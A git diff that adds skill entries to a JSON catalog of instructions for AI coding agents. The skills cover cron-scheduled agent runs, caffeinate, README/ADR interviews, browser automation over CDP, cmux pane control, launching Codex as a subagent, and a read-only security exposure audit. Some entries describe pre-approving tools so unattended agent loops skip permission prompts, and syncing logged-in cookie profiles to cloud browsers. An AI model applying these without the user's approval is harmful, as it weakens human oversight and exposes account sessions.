@@ -1000,6 +1000,32 @@
       "scrapedAt": "2026-03-08T06:53:18.399Z"
     },
     {
+      "id": "antigravity-agent-self-scheduling",
+      "name": "agent-self-scheduling",
+      "slug": "agent-self-scheduling",
+      "description": "Schedule AI agent runs with cron, loops, or external clocks while avoiding unsafe tight autonomous timers.",
+      "category": "AI & Agents",
+      "source": "antigravity",
+      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
+      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/agent-self-scheduling",
+      "content": "\n# Agent Self-Scheduling\n\n## When to Use\n\n- Use when the user asks for recurring, scheduled, heartbeat, or looped agent work.\n- Use when you need to choose between cron, external schedulers, hooks, or built-in agent scheduling.\n\nFirst question: does the agent have a built-in scheduler (Hermes → Camp B), or do you own the clock (everything else → Camp A)?\n\nUniversal floor: cron is 1 minute minimum (5-field expr, no seconds) — every camp. For sub-minute you MUST use a `while ...; sleep N; done` loop, a TS extension, or an event hook. Never put an LLM on a tight timer.\n\n## Camp A — one-shot agents, you own the clock\n\nThese run once and exit (amnesiac unless resumed). Schedule them externally.\n\n```bash\nclaude -p \"PROMPT\" --output-format json --allowedTools \"Read,Edit,Bash\"  # Claude Code\ncodex exec --json \"PROMPT\"                                                # Codex\npi run \"PROMPT\"                                                           # Pi\n```\n\nWrap in a clock:\n\n```bash\n# 1. cron (>= 1 min floor)\n*/10 * * * * cd /path/to/project && pi run \"check X and report\" >> ~/agent.log 2>&1\n# 2. systemd timer (Linux, survives reboot, better logging) — OnUnitActiveSec=10min\n# 3. dumb loop (sub-minute, or no cron available)\nwhile true; do pi run \"check X\"; sleep 30; done\n```\n\nGotchas (each breaks unattended runs if ignored):\n- **Permissions hang forever.** Pass `--allowedTools` (Claude) or sandbox/auto-approve flags (Codex), or the run blocks on a prompt.\n- **Use JSON output** (`--output-format json` / `--json`) so the wrapper parses results deterministically.\n- **Runs are amnesiac.** Resume (`codex exec resume --last`) or persist state to a file the next run reads.\n\nPi has NO built-in scheduler/loop/heartbeat by design — external clock only (or a TS extension for agent-side timers).\n\n### cmux — orchestration only, NO scheduler\n\ncmux has no timer/watch/cron. Three ways to loop it: orchestrator-driven (`send` → `sleep` → `read-screen` on your own clock), a dumb while-sleep wrapper, or — preferred — event-driven via `cmux notify` + OSC terminal hooks, which is cheaper and more responsive than polling. `read-screen` is non-interruptive, safe to poll.\n\nIf a loop checks another agent, send the user a one-line status each check: what the agent is doing, on track or not. (Claude Code may prefill a predicted next user message after finishing — that's Claude, not the user.)\n\n## Camp B — Hermes built-in scheduler\n\nHermes' gateway ticks every 60s and runs due jobs in fresh isolated sessions. State-check first:\n\n```bash\nhermes gateway install            # user-level ( --system to survive reboot)\nhermes cron create \"every 1h\" \"summarize new emails and report\" --skill himalaya\nhermes cron create \"0 9 * * *\" \"post daily standup\"      # cron expr\nhermes cron create \"30m\" \"one-shot reminder in 30 min\"   # one-shot delay\n```\n\nHermes-unique: **zero-token mode** (run a script, deliver stdout verbatim — use for watchdogs), **chaining** (`context_from` pipes one job's output into the next), **self-terminating loops**, and **loop safety** (scheduled sessions cannot create more cron jobs — don't schedule from inside a scheduled job). Each run is a fresh session: the prompt must carry all context.\n\n## Heartbeat pattern\n\nOne fast recurring tick gates many slower per-task checks: the tick reads a task list + per-task `last_run` timestamps and only acts on tasks that are due. In Hermes use a recurring job (zero-token mode when nothing's due); in Camp A use a while-sleep loop. Define active-hours, and stay silent when nothing is due — no empty noise.\n\n## Verify it fires (before reporting success)\n\n1. Camp A: log file grows after one interval, or run the wrapped command once by hand → clean JSON, exit 0.\n2. Camp B: `hermes cron list` shows the job + sane `next_run`; trigger a run-now to confirm delivery.\n3. Confirm permission/sandbox flags are present — the #1 silent failure is a hung permission prompt.\n4. Heartbeats: confirm a nothing-due tick stays silent.\n\n## Limitations\n\n- Adapted from `davidondrej/skills`; verify local paths, tools, credentials, and agent features before acting.\n- For commands, remote access, scheduling, browser automation, or file-changing workflows, get explicit user approval and confirm the target environment first.\n",
+      "tags": [
+        "claude",
+        "ai",
+        "agent",
+        "llm",
+        "automation",
+        "workflow",
+        "design",
+        "cro"
+      ],
+      "useCases": [
+        "Use when the user asks for recurring, scheduled, heartbeat, or looped agent work.",
+        "Use when you need to choose between cron, external schedulers, hooks, or built-in agent scheduling."
+      ],
+      "scrapedAt": "2026-07-07T09:52:11.080Z"
+    },
+    {
       "id": "antigravity-agent-squad",
       "name": "agent-squad",
       "slug": "agent-squad",
@@ -2384,6 +2410,30 @@
       ],
       "useCases": [],
       "scrapedAt": "2026-01-29T06:57:55.912Z"
+    },
+    {
+      "id": "antigravity-anti-sleep",
+      "name": "anti-sleep",
+      "slug": "anti-sleep",
+      "description": "Keep a Mac awake with caffeinate during long builds, downloads, or supervised automation runs.",
+      "category": "AI & Agents",
+      "source": "antigravity",
+      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
+      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/anti-sleep",
+      "content": "\n# Anti-Sleep (macOS caffeinate)\n\n## When to Use\n\n- Use when the user wants the Mac to stay awake during a long supervised task.\n- Use when a build, download, or automation run should not be interrupted by sleep.\n\nKeep the Mac awake using the built-in `caffeinate` command. No install needed.\n\n## Quick start — the standard command\n\n```bash\ncaffeinate -d -i -t 7200    # full power: screen stays on + no idle sleep, for 2 hours\n```\n\nDuration is `-t <seconds>`: 2h = 7200, 7h = 25200, overnight (9h) = 32400.\n\n## Aggressiveness levels\n\n| Flags | Effect |\n|---|---|\n| `-i` | prevents idle **system** sleep only (screen may still dim/lock) |\n| `-d` | prevents **display** sleep (screen stays on) |\n| `-d -i` | **default choice** — screen on + system awake |\n| `-d -i -s` | adds `-s`: prevents sleep even on AC power semantics; `-s` only works when plugged in |\n| `-u -t 1` | simulates user activity — wakes the display right now |\n\nDefault to `-d -i -t <seconds>` unless the user says otherwise.\n\n## Tie to a process instead of a timer\n\n```bash\ncaffeinate -d -i -w <PID>          # stays awake until that process exits (great for builds)\ncaffeinate -i npm run build       # wraps a command; exits when the command finishes\n```\n\n## Run it in a visible terminal (cmux pane)\n\nPrefer running it in the user's own terminal pane so it's visible and easy to Ctrl+C. In cmux (read the `cmux` skill first if interacting with panes):\n\n```bash\ncmux send --surface surface:<N> \"caffeinate -d -i -t 25200\\n\"\n```\n\nOtherwise run it as a background Bash task. Never block your own foreground shell with it.\n\n## Verify and monitor\n\n```bash\npgrep -fl caffeinate                       # is it running? shows exact flags\nps -o etime= -p <PID>                      # how long it's been running\npmset -g assertions | grep -i deny        # confirm sleep assertions are active\n```\n\n**Gotcha:** `caffeinate` prints nothing and holds the prompt — it looks \"stuck\" or like Enter wasn't pressed. It isn't stuck. Verify with `pgrep`, not by looking at the terminal.\n\n**Expiry:** with `-t` it exits silently when time runs out — no notification. If the user asks \"is it still on?\" after hours, check `pgrep` first; it may simply have expired.\n\n## Keyboard backlight\n\n`caffeinate` cannot keep the keyboard backlight on — it has its own inactivity timer with no CLI/API on Apple Silicon (researched 2026-07). Fix is manual, one-time: System Settings > Keyboard > \"Turn keyboard backlight off after inactivity\" > Never.\n\n## Stop early\n\n```bash\npkill -f \"caffeinate -d -i\"    # or Ctrl+C in the pane running it\n```\n\nAfter starting: confirm to the user the PID, the flags, and the wall-clock time it will expire.\n\n## Limitations\n\n- Adapted from `davidondrej/skills`; verify local paths, tools, credentials, and agent features before acting.\n- For commands, remote access, scheduling, browser automation, or file-changing workflows, get explicit user approval and confirm the target environment first.\n",
+      "tags": [
+        "api",
+        "claude",
+        "ai",
+        "agent",
+        "automation",
+        "workflow"
+      ],
+      "useCases": [
+        "Use when the user wants the Mac to stay awake during a long supervised task.",
+        "Use when a build, download, or automation run should not be interrupted by sleep."
+      ],
+      "scrapedAt": "2026-07-07T09:52:32.898Z"
     },
     {
       "id": "antigravity-anti-sycophancy",
@@ -8244,6 +8294,31 @@
       "scrapedAt": "2026-02-19T07:09:59.946Z"
     },
     {
+      "id": "antigravity-brain-to-docs",
+      "name": "brain-to-docs",
+      "slug": "brain-to-docs",
+      "description": "Interview the user to turn project vision and decisions into README and ADR documentation.",
+      "category": "Document Processing",
+      "source": "antigravity",
+      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
+      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/brain-to-docs",
+      "content": "\n# brain-to-docs\n\n## When to Use\n\n- Use when the user wants to extract project vision, decisions, or preferences into durable docs.\n- Use when README and ADRs should be built through a back-and-forth interview.\n\nThe whole purpose: extract as much of the user's taste, judgment, knowledge, vision,\npreferences, and decisions as possible into text — saved as clear, concise\nmarkdown docs for the project. README holds the vision; `docs/adr/` holds the\ndecisions.\n\n## The loop\n\n1. **Check docs first, every time.** Read `docs/adr/` (and `README.md`) before\n   doing anything — other agents and people add/edit ADRs constantly.\n2. **Ask 5 different questions** in plain text (never a questions UI) — default 5\n   unless the user asks for a different number. Make them high-variety: a wide,\n   creative spectrum of unique angles, not all the same type (e.g. not all \"tech\n   stack\" or all \"product\" or all \"monetization\"). Exception: if the user asks for a\n   specific focus area, follow it. The user answers whichever they find most useful.\n3. **Update docs after EVERY answer** — no exceptions. You decide whether it\n   updates `README.md` or becomes a new ADR — whatever makes sense.\n4. Repeat until the user says \"we're done\" (or similar).\n\n## Rules\n\n- All answers & responses during this \"brain to docs\" process must be VERY\n  CONCISE, all sentences should be SHORT, and everything should be written in\n  PLAIN ENGLISH.\n- ADRs: short, numbered `NNNN-slug.md`, Status + Context + Decision + Consequences.\n- README: vision only. Decisions go in ADRs.\n- Don't challenge the user's thinking unless they ask, or they're making a severe mistake.\n\n## Limitations\n\n- Adapted from `davidondrej/skills`; verify local paths, tools, credentials, and agent features before acting.\n- For commands, remote access, scheduling, browser automation, or file-changing workflows, get explicit user approval and confirm the target environment first.\n",
+      "tags": [
+        "markdown",
+        "claude",
+        "ai",
+        "agent",
+        "automation",
+        "workflow",
+        "document"
+      ],
+      "useCases": [
+        "Use when the user wants to extract project vision, decisions, or preferences into durable docs.",
+        "Use when README and ADRs should be built through a back-and-forth interview."
+      ],
+      "scrapedAt": "2026-07-07T09:53:54.796Z"
+    },
+    {
       "id": "superpowers-brainstorming",
       "name": "brainstorming",
       "slug": "superpowers-brainstorming",
@@ -8677,6 +8752,34 @@
         "User mentions or implies: manifest v3"
       ],
       "scrapedAt": "2026-01-26T13:17:09.443Z"
+    },
+    {
+      "id": "antigravity-browser-harness",
+      "name": "browser-harness",
+      "slug": "browser-harness",
+      "description": "Drive an existing browser through CDP for authenticated, visual, or interactive web automation.",
+      "category": "Document Processing",
+      "source": "antigravity",
+      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
+      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/browser-harness",
+      "content": "\n# browser-harness\n\n## When to Use\n\n- Use when a task needs a real logged-in browser, visible interaction, or JS-heavy page control.\n- Use when static fetches are insufficient and CDP browser automation is appropriate.\n\nDirect browser control via CDP. For task-specific edits, use `agent-workspace/agent_helpers.py`. For setup, install, or connection problems, read install.md.\n\n**Routing check first:** if the task needs no interaction (no clicks, logins, or forms) and you just want page content, use DeepAPI `POST /v1/scrape/website` instead of driving a browser — see the `deepapi` skill. Use browser-harness when the task needs a real browser: interaction, JS-heavy flows, logged-in sessions, or visual verification.\n\nDomain skills (community-contributed per-site playbooks under `agent-workspace/domain-skills/`) are off by default. Set `BH_DOMAIN_SKILLS=1` to enable them; see the bottom section.\n\n**If `BH_DOMAIN_SKILLS=1` and the task is site-specific, read every file in the matching `agent-workspace/domain-skills/<site>/` directory before inventing an approach.**\n\n## Usage\n\n```bash\nbrowser-harness -c '\nnew_tab(\"https://docs.browser-use.com\")\nwait_for_load()\nprint(page_info())\n'\n```\n\n- Invoke as browser-harness — it's on $PATH. No cd, no uv run.\n- First navigation is new_tab(url), not goto_url(url) — goto runs in the user's active tab and clobbers their work.\n\n## Tool call shape\n\n```bash\nbrowser-harness -c '\n# any python. helpers pre-imported. daemon auto-starts.\n'\n```\n\nrun.py calls ensure_daemon() before exec — you never start/stop manually unless you want to.\n\n### Remote browsers\n\nUse remote for parallel sub-agents (each gets its own isolated browser via a distinct BU_NAME) or on a headless server. BROWSER_USE_API_KEY must be set. start_remote_daemon, list_cloud_profiles, list_local_profiles, sync_local_profile are pre-imported.\n\nWhen supervising those sub-agents, after each check send the user one very short status line: what they are doing and whether they are on track.\n\nClaude Code cmux note: after Claude finishes, it may prefill a predicted next user message; that draft is Claude, not the user speaking.\n\n```bash\nbrowser-harness -c '\nstart_remote_daemon(\"work\")                               # default — clean browser, no profile\n# start_remote_daemon(\"work\", profileName=\"my-work\")      # reuse a cloud profile (already logged in)\n# start_remote_daemon(\"work\", profileId=\"<uuid>\")         # same, but by UUID\n# start_remote_daemon(\"work\", proxyCountryCode=\"de\", timeout=120)   # DE proxy, 2-hour timeout\n# start_remote_daemon(\"work\", proxyCountryCode=None)      # disable the Browser Use proxy\n'\n\nBU_NAME=work browser-harness -c '\nnew_tab(\"https://example.com\")\nprint(page_info())\n'\n```\n\nstart_remote_daemon prints liveUrl and auto-opens it in the local browser (if a GUI is detected) so the user can watch along. Headless servers print only — share the URL with the user. The daemon PATCHes the cloud browser to stop on shutdown, which persists profile state. Running remote daemons bill until timeout.\n\nProfiles (cookies-only login state) live in interaction-skills/profile-sync.md — covers list_cloud_profiles(), the chat-driven \"which profile?\" pattern, and sync_local_profile() for uploading a local Chrome profile.\n\n## Interaction skills\n\nIf you start struggling with a specific mechanic while navigating, look in interaction-skills/ for helpers. They cover reusable UI mechanics like dialogs, tabs, dropdowns, iframes, and uploads. The available interaction skills are:\n- connection.md\n- cookies.md\n- cross-origin-iframes.md\n- dialogs.md\n- downloads.md\n- drag-and-drop.md\n- dropdowns.md\n- iframes.md\n- network-requests.md\n- print-as-pdf.md\n- profile-sync.md\n- screenshots.md\n- scrolling.md\n- shadow-dom.md\n- tabs.md\n- uploads.md\n- viewport.md\n\n## What actually works\n\n- Screenshots first: use capture_screenshot() to understand the current page quickly, find visible targets, and decide whether you need a click, a selector, or more navigation.\n- Clicking: capture_screenshot() → read the pixel off the image → click_at_xy(x, y) → capture_screenshot() to verify. Suppress the Playwright-habit reflex of \"locate first, then click\" — no getBoundingClientRect, no selector hunt. Drop to DOM only when the target has no visible geometry (hidden input, 0×0 node). Hit-testing happens in Chrome's browser process, so clicks go through iframes / shadow DOM / cross-origin without extra work.\n- Bulk HTTP: http_get(url) + ThreadPoolExecutor. No browser for static pages (249 Netflix pages in 2.8s).\n- After goto: wait_for_load().\n- Wrong/stale tab: ensure_real_tab(). Use it when the current tab is stale or internal; the daemon also auto-recovers from stale sessions on the next call.\n- Verification: print(page_info()) is the simplest \"is this alive?\" check, but screenshots are the default way to verify whether a visible action actually worked.\n- DOM reads: use js(...) for inspection and extraction when the screenshot shows that coordinates are the wrong t",
+      "tags": [
+        "python",
+        "node",
+        "pdf",
+        "api",
+        "claude",
+        "ai",
+        "agent",
+        "automation",
+        "workflow",
+        "design"
+      ],
+      "useCases": [
+        "Use when a task needs a real logged-in browser, visible interaction, or JS-heavy page control.",
+        "Use when static fetches are insufficient and CDP browser automation is appropriate."
+      ],
+      "scrapedAt": "2026-07-07T09:54:00.515Z"
     },
     {
       "id": "antigravity-browser-testing-with-devtools",
@@ -10602,6 +10705,34 @@
       "scrapedAt": "2026-02-25T07:11:21.399Z"
     },
     {
+      "id": "antigravity-cmux",
+      "name": "cmux",
+      "slug": "cmux",
+      "description": "Control cmux workspaces, panes, surfaces, and agent sessions safely from macOS terminal workflows.",
+      "category": "Document Processing",
+      "source": "antigravity",
+      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
+      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/cmux",
+      "content": "\n# cmux Control\n\n## When to Use\n\n- Use when you need to inspect, create, close, or rearrange cmux panes, surfaces, or workspaces.\n- Use when you need to send input to or monitor agents running inside cmux.\n\ncmux is a native macOS terminal app for running multiple AI coding agents in parallel. It exposes a CLI (`cmux`) and a Unix-socket JSON-RPC API (`/tmp/cmux.sock`) for full topology and browser control.\n\n## Core Concepts\n\n- **Window** — top-level macOS cmux window\n- **Workspace** — sidebar tab within a window (one git branch / project context)\n- **Pane** — split region inside a workspace\n- **Surface** — tab inside a pane (terminal or browser)\n\nHandles default to short refs (`workspace:2`, `pane:1`, `surface:7`); UUIDs accepted as input. Add `--id-format uuids|both` for UUID output.\n\n### Ref syntax — get this right or fail silently\n\n- **Always use PREFIXED refs** (`pane:38`, `surface:46`). A **bare number is treated as an INDEX, not an ID** — `--surface 46` means \"the surface at index 46\" (usually nonexistent → silent failure), NOT `surface:46`.\n- **`read-screen` and `capture-pane` have NO `--pane` flag** — they target `--workspace` or `--surface` only. Passing `--pane` errors, and a bare/missing target falls back to your OWN surface (you'll read your own footer and draw wrong conclusions). To read a pane: resolve it to a surface FIRST with `cmux list-pane-surfaces --pane pane:N`, then `cmux read-screen --surface surface:N`.\n- **Never append `2>/dev/null` to cmux commands.** Errors go to stderr with exit code 1; suppressing them blinds you to your own ref/flag mistakes (the #1 cause of \"(no output)\").\n\n## Detect cmux in a Shell\n\n```bash\n[ -S \"${CMUX_SOCKET_PATH:-/tmp/cmux.sock}\" ] || exit 0   # bail if not in cmux\n[ -n \"${CMUX_WORKSPACE_ID:-}\" ] && echo \"inside cmux surface\"\n```\n\nInjected env vars in every cmux-spawned terminal: `CMUX_WORKSPACE_ID`, `CMUX_SURFACE_ID`, `CMUX_SOCKET_PATH`, `CMUX_PORT`. **Always anchor automation to `CMUX_WORKSPACE_ID`** — the visually focused workspace may not be the agent's caller workspace.\n\n## Fast Start — Topology\n\n```bash\ncmux identify --json                              # who am I (window/workspace/pane/surface)\ncmux tree                                         # full hierarchy\ncmux list-workspaces --json\ncmux list-panes --workspace \"$CMUX_WORKSPACE_ID\"\ncmux list-surfaces --workspace \"$CMUX_WORKSPACE_ID\"\n\ncmux new-workspace --name \"feature-x\" --cwd /path/to/repo\ncmux new-pane --workspace \"$CMUX_WORKSPACE_ID\" --type terminal --direction right --focus false\ncmux new-pane --workspace \"$CMUX_WORKSPACE_ID\" --type browser  --direction right --url http://localhost:3000\ncmux move-surface --surface surface:7 --pane pane:2 --focus false\ncmux split-off --surface surface:7 right\ncmux reorder-surface --surface surface:7 --before surface:3\ncmux close-surface --surface surface:7\n```\n\n## Polling Pi Agents in Panes — Keep Sleeps Short\n\nWhen launching a Pi Agent inside a cmux pane and polling for output, use **short `sleep` intervals (2–5s)**. Pi is fast and minimal, and the user runs it on Opus 4.8 Fast via OpenRouter, which streams tokens extremely quickly. Do NOT use `sleep 15` unless genuinely needed (a big build/refactor) — most of the time `sleep 2`–`sleep 5` is more than enough.\n\nAfter every agent check, send the user a one-line status update: what the agent is doing and whether it is on track. Keep it extremely concise.\n\nClaude Code cmux note: after Claude finishes, it may prefill a predicted next user message; that draft is Claude, not the user speaking.\n\n## Send Input\n\n**Command names:** there is NO `send-surface` / `send-key-surface`. Target a specific surface with the `--surface` flag on `send` / `send-key` (same commands as the focused terminal). `send-panel` / `send-key-panel` exist ONLY for panels (`--panel`), not surfaces.\n\n```bash\ncmux send \"echo hi\\n\"                                       # focused terminal\ncmux send-key \"ctrl+c\"                                       # enter|tab|esc|backspace|arrows|ctrl+x|shift+tab\ncmux send --surface surface:7 \"npm run build\"               # specific surface (NOT send-surface)\ncmux send-key --surface surface:7 enter                     # specific surface (NOT send-key-surface)\n```\n\n## Notifications & Sidebar Metadata\n\n```bash\ncmux notify --title \"Done\" --body \"tests passed\"\ncmux set-status build \"compiling\" --icon hammer --color \"#ff9500\"\ncmux set-progress 0.5 --label \"Building...\"\ncmux log --level success \"All 42 tests passed\"               # info|progress|success|warning|error\ncmux trigger-flash --workspace \"$CMUX_WORKSPACE_ID\"          # blue-ring attention cue\ncmux sidebar-state --json                                    # dump all sidebar metadata\n```\n\n## Browser Automation (WKWebView)\n\nWorkflow: open → wait → snapshot → act → re-snapshot.\n\n```bash\nS=$(cmux --json browser open https://example.com | jq -r .result.surface_ref)\ncmux browser \"$S\" wait --load-state complete --timeout-ms 15000\ncmux browser \"$S\" snapshot --interactive  ",
+      "tags": [
+        "python",
+        "pdf",
+        "markdown",
+        "api",
+        "claude",
+        "ai",
+        "agent",
+        "automation",
+        "workflow",
+        "document"
+      ],
+      "useCases": [
+        "Use when you need to inspect, create, close, or rearrange cmux panes, surfaces, or workspaces.",
+        "Use when you need to send input to or monitor agents running inside cmux."
+      ],
+      "scrapedAt": "2026-07-07T09:54:26.315Z"
+    },
+    {
       "id": "antigravity-co-marketing",
       "name": "co-marketing",
       "slug": "co-marketing",
@@ -11298,6 +11429,31 @@
         "When reviewing large-scale refactoring"
       ],
       "scrapedAt": "2026-01-26T13:17:39.700Z"
+    },
+    {
+      "id": "antigravity-codex-subagent",
+      "name": "codex-subagent",
+      "slug": "codex-subagent",
+      "description": "Launch Codex CLI as an isolated subagent for bounded coding, review, or verification tasks.",
+      "category": "AI & Agents",
+      "source": "antigravity",
+      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
+      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/codex-subagent",
+      "content": "\n# Codex CLI as a Subagent\n\n## When to Use\n\n- Use when a bounded coding, review, or verification task can run in a separate Codex CLI session.\n- Use when parallel work needs explicit file ownership and a clear definition of done.\n\nCodex CLI is OpenAI's terminal coding agent. `codex exec` runs it non-interactively:\nit works autonomously in a sandbox, streams progress to stderr, and prints only the\nfinal message to stdout. Auth reuses the user's ChatGPT subscription — never an API key.\n\n## When to delegate\n\n- Self-contained coding task with clear success criteria (fix, feature, refactor, review).\n- Parallel work: several independent tasks at once (see Parallel runs).\n- Second opinion / independent verification of your own changes.\n\nDo NOT delegate tasks that need conversation context you can't fully write into the prompt.\n\n## Preflight\n\n```bash\ncodex --version       # missing? npm i -g @openai/codex  (or: brew install --cask codex)\ncodex login status    # exit 0 + \"Logged in using ChatGPT\" = ready\n```\n\nNot logged in → stop and tell the user to run `codex login` (one-time browser OAuth).\nNever read, print, or copy credentials (`~/.codex/auth.json`).\n\n## Launch\n\n```bash\nOUT=$(mktemp /tmp/codex-out.XXXXXX)\ncodex exec \\\n  --cd /path/to/repo \\\n  --sandbox workspace-write \\\n  --output-last-message \"$OUT\" \\\n  \"Full task prompt: goal, constraints, files to touch, definition of done.\" \\\n  </dev/null\n```\n\n- `</dev/null` is MANDATORY when stdin is not a real terminal (background shells,\n  scripts): codex treats open stdin as extra context and waits forever for EOF.\n- Codex sees NOTHING of your conversation. Put all context in the prompt:\n  goal, relevant paths, constraints, and how to verify it's done.\n- Long prompt? Pipe it via stdin instead: `codex exec [flags] - < /tmp/task.md`.\n- Wrap the command in a background/Bash subagent if your host agent has one\n  (Cursor: Task tool with a shell subagent) so Codex's verbose stream stays out\n  of the parent context. Fallback: a plain background terminal.\n- Runs take minutes and have no built-in timeout — background it and monitor.\n- Optional: `-m <model>` to override the model, `--json` for JSONL event stream.\n\n## Collect results\n\n```bash\ncat \"$OUT\"                            # final message = the deliverable\ngit -C /path/to/repo status --short   # see what Codex actually changed\n```\n\nFollow-up in the same session (run from the same cwd — resume filters by cwd):\n\n```bash\ncodex exec resume --last \"follow-up instruction\" </dev/null\n```\n\n## Parallel runs\n\nParallelize only genuinely independent tasks, and assign file ownership upfront so\nresults merge cleanly. One git worktree per Codex run — never two in the same tree:\n\n```bash\ngit worktree add /tmp/wt-taskA -b codex/task-a\ncodex exec --cd /tmp/wt-taskA --sandbox workspace-write -o /tmp/outA.md \"task A\" </dev/null\n```\n\n## Failure modes\n\n- Hangs forever with no output → stdin was left open. Kill it, relaunch with `</dev/null`.\n- `codex login status` non-zero → the user must run `codex login`. Don't work around it.\n- ChatGPT plan rate limit hit → report to the user; never retry in a loop.\n- \"Not a git repo\" error → add `--skip-git-repo-check`, or init a repo first.\n- Network is blocked inside the workspace-write sandbox by default. If the task\n  needs it (installs, API calls): `-c sandbox_workspace_write.network_access=true`.\n- NEVER use `--dangerously-bypass-approvals-and-sandbox`.\n\n## Rules\n\n- One task per launch. Split big jobs into multiple launches.\n- Review Codex's diff yourself before declaring the task done.\n\n## Cursor-native wrapper (optional)\n\nFor auto-routing and `/codex` invocation inside Cursor, add `~/.cursor/agents/codex.md` —\na custom subagent whose description is \"delegates coding tasks to Codex CLI\" and whose\nbody points at this skill.\n\n## Limitations\n\n- Adapted from `davidondrej/skills`; verify local paths, tools, credentials, and agent features before acting.\n- For commands, remote access, scheduling, browser automation, or file-changing workflows, get explicit user approval and confirm the target environment first.\n",
+      "tags": [
+        "api",
+        "claude",
+        "ai",
+        "agent",
+        "gpt",
+        "automation",
+        "workflow"
+      ],
+      "useCases": [
+        "Use when a bounded coding, review, or verification task can run in a separate Codex CLI session.",
+        "Use when parallel work needs explicit file ownership and a clear definition of done."
+      ],
+      "scrapedAt": "2026-07-07T09:54:35.935Z"
     },
     {
       "id": "antigravity-cold-email",
@@ -13556,6 +13712,34 @@
       "scrapedAt": "2026-06-07T09:27:47.918Z"
     },
     {
+      "id": "antigravity-cyber-audit",
+      "name": "cyber-audit",
+      "slug": "cyber-audit",
+      "description": "Run read-only exposure checks for security advisories and write a structured local audit report.",
+      "category": "Document Processing",
+      "source": "antigravity",
+      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
+      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/cyber-audit",
+      "content": "\n# cyber-audit\n\n## When to Use\n\n- Use when the user asks whether their machine or projects are affected by a CVE, breach, or package advisory.\n- Use when a read-only local security exposure report is appropriate.\n\n## Hard rules\n\n- **Read-only.** No installs, removes, upgrades, restarts, network calls, or file modifications outside `~/Documents/security-audits/`.\n- **No `sudo`.** Never.\n- **One report per invocation.** Always end by writing the `.md` file (even if the verdict is \"Not affected\" — the audit trail matters).\n- If a check requires a state-changing command, **skip it and note \"not checked (would require state change)\"** in the table. Do not run it.\n\n## Workflow\n\n1. **Identify scope.** Extract from the advisory: package/binary name, affected versions, platform (macOS / Linux / Windows), attack vector (supply chain / RCE / local / network).\n2. **Run checks in parallel** (Bash tool, multiple calls in one message). Pick relevant checks for the advisory type — don't run all of them.\n3. **Build the table** as you go. Each row = one check + concrete result (version number, path, \"None\", \"N/A\").\n4. **Write the report** to `~/Documents/security-audits/YYYY-MM-DD-<short-kebab-slug>.md`. Use today's date from the environment header.\n5. **Tell the user** the verdict in one line + path to the report.\n\n## Check menu (pick what's relevant)\n\n```bash\n# --- Node / npm ecosystem (supply-chain advisories) ---\nwhich npm pnpm yarn; npm root -g; pnpm root -g 2>/dev/null\nls /opt/homebrew/lib/node_modules                                  # global npm\nfind ~ -maxdepth 8 -type d -name \"<pkg>\" 2>/dev/null \\\n  | grep -v -E \"(Library/Caches|\\.Trash)\"                          # installed copies\nfind ~/Documents ~/Desktop ~/Downloads -maxdepth 8 -type f \\\n  \\( -name \"package.json\" -o -name \"package-lock.json\" \\\n     -o -name \"pnpm-lock.yaml\" -o -name \"yarn.lock\" \\) 2>/dev/null \\\n  | xargs grep -l \"<pkg>\" 2>/dev/null                              # direct + transitive\n\n# --- Python ecosystem ---\nwhich python3 pip pipx uv\npip list 2>/dev/null | grep -i \"<pkg>\"\nfind ~/Documents -maxdepth 6 -name \"requirements*.txt\" -o -name \"pyproject.toml\" \\\n  -o -name \"poetry.lock\" -o -name \"uv.lock\" 2>/dev/null | xargs grep -l \"<pkg>\" 2>/dev/null\n\n# --- Homebrew / system binaries ---\nbrew list --versions <formula> 2>/dev/null\nwhich <binary>; <binary> --version 2>/dev/null\n\n# --- Running processes / listeners (for RCE / network CVEs) ---\npgrep -lf \"<binary>\"\nlsof -iTCP -sTCP:LISTEN -P -n 2>/dev/null | grep \"<port>\"\n\n# --- LaunchAgents / LaunchDaemons (persistence / autostart) ---\nls ~/Library/LaunchAgents /Library/LaunchAgents /Library/LaunchDaemons 2>/dev/null \\\n  | grep -i \"<vendor>\"\n\n# --- Env vars that change exposure (e.g. OLLAMA_HOST, listening addr) ---\nlaunchctl getenv <VAR>; grep -r \"<VAR>\" ~/.zshrc ~/.zprofile ~/.config 2>/dev/null\n\n# --- VS Code / browser extensions (for IDE-targeted advisories) ---\nls ~/.vscode/extensions 2>/dev/null | grep -i \"<ext>\"\n```\n\nIf the advisory mentions an ecosystem not above (Rust cargo, Go modules, Ruby gems, Docker images, etc.), apply the same pattern: global install path + manifest grep + running processes.\n\n## Report template\n\nFile: `~/Documents/security-audits/YYYY-MM-DD-<short-kebab-slug>.md`\n\n```markdown\n# <Subject> — Audit\n\n**Date:** YYYY-MM-DD\n**Host:** the user's Mac\n\n## <CVEs | Advisory> in scope\n\n- **<ID or source> \"<Name>\"** — <one-line description>. <Affected versions or scope>.\n\n## Audit results\n\n| Check | Result |\n|---|---|\n| <Check 1> | <Result> |\n| <Check 2> | <Result> |\n\n## Verdict\n\n**<Not affected. | Affected. | Partially affected.>**\n\n- <Rationale bullet 1>\n- <Rationale bullet 2>\n\n## Action taken\n\nNone — diagnostic only, no files modified, no <packages installed/removed | services started/stopped | firewall rules changed>.\n\n## Follow-ups\n\n- <Actionable item, or \"None\" if truly nothing>\n```\n\nMatch the tone of the two existing reports in `~/Documents/security-audits/` — terse, factual, bulleted, no hedging.\n\n## Verdict wording\n\n- **Not affected.** — package/binary absent, or installed but patched, or not running and not exposed.\n- **Affected.** — vulnerable version present *and* reachable by the attack vector.\n- **Partially affected.** — present but mitigated (e.g. binary installed but service not running, or listener bound to loopback only). Spell out the mitigation in the bullets.\n\n## When to break the read-only rule\n\nNever on your own. If the 